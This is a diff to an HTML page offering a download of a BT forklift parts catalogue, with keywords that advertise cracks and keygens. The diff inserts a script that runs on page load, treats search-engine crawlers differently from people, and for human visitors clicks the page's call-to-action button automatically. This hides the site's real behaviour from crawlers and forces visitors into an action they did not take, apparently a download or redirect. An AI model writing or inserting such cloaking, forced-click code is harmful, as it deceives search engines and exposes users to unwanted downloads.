@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BT Forklift Quality PartsArena 5.0.0 06.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download BT Forklift Quality PartsArena 5.0.0 for June 2024. Comprehensive parts catalog for BT forklifts with service and safety guidelines.">
     <meta name="keywords" content="BT Forklift Quality PartsArena 5.0.0 06.2024, BT Forklift Quality PartsArena download, BT Forklift Quality PartsArena free download, BT Forklift Quality PartsArena 2024, BT Forklift Quality PartsArena 5.0.0, BT Forklift Quality PartsArena catalogue free download, BT Forklift Parts 5.0.0 2024, BT Forklift Spare Parts Catalog download, BT Forklift Manuals, Forklift Material Handling Software, BT Forklift Electronic System Components, BT Products Original Accessories, BT Forklift Service Instructions, BT Forklift Operation Guidelines, BT Forklift Assembly Instructions, BT Forklift Performance Optimization, BT Forklift Safety Guidelines, BT Forklift software 2024, BT Forklift parts catalog download, BT Forklift parts catalog free download, BT Forklift software keygen, BT Forklift software crack, BT Forklift catalogue download, BT Forklift electronic parts catalog 2024, BT Forklift parts and accessories 2024, BT ремни вилочных погрузчиков, запчасти BT Forklift скачать, каталог BT Forklift скачать бесплатно, запчасти BT Forklift 2024, электронный каталог запчастей вилочные погрузчики BT, каталог запчастей вилочные погрузчики скачать, каталог запчастей вилочные погрузчики бесплатно, каталог запасных частей вилочные погрузчики BT, інструкції з обслуговування вилочних навантажувачів BT, складське обладнання вилочних погрузчиків BT, каталог запчастин вилочни погрузчики BT безкоштовно, каталог запчастин BT Forklift 2024">
     <style>
